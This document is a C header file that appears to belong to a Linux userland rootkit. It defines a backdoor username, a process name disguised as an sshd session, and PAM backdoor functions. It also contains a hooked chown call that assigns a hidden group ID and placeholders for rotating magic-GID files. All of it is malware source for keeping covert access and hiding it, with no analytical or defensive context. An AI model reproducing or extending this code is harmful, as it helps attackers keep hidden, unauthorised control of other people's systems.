#ifndef UTIL_H
#define UTIL_H

#define HOME_VAR       "HOME="INSTALL_DIR
#define BD_SSHPROCNAME "sshd: "BD_UNAME

#define CMDLINE_PATH      "/proc/%d/cmdline"
#define FALLBACK_PROCNAME "YuuUUU"
#define NAME_MAXLEN       128     /* max lengths for storing process name */
#define CMDLINE_MAXLEN    512     /* & cmdline string. */

#define PID_MAXLEN      30      /* max length in bytes a pid can be */
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     0x01   /* defined modes for determining whether */
#define MODE_CMDLINE  0x02   /* to get just the process name or its full */
                             /* cmdline entry. */

char *get_cmdline(pid_t pid);
int  open_cmdline(pid_t pid);

char *process_info(pid_t pid, int mode);
/* macros for the use of process_info() for calling processes. */
#define process_name()    process_info(getpid(), MODE_NAME)
#define process_cmdline() process_info(getpid(), MODE_CMDLINE)

int cmp_process(char *name);
char *str_process(char *name);
int process(char *name);
#ifdef USE_PAM_BD
int bd_sshproc(void);
#endif
#include "processes.c"

#define isbduname(name) !strncmp(BD_UNAME, name, strlen(BD_UNAME))

int chown_path(char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, 0, gid);
}

int not_user(int id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}

/* these macro functions were taken from one of PAM's headers.
 * we didn't need the full header, only these two functions.
 * i forget which header they're from originally. */
#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)

#endif

#define GID_PATH "??GID_PATH??" // [READ_GID_FROM_FILE]
#define GIDTIME_PATH "??GIDTIME_PATH??" // [AUTO_GID_CHANGER]
#include "gid/gid.h"
void unset_bad_vars(void);
int is_bdusr(void);
#include "bdusr.c"

#endif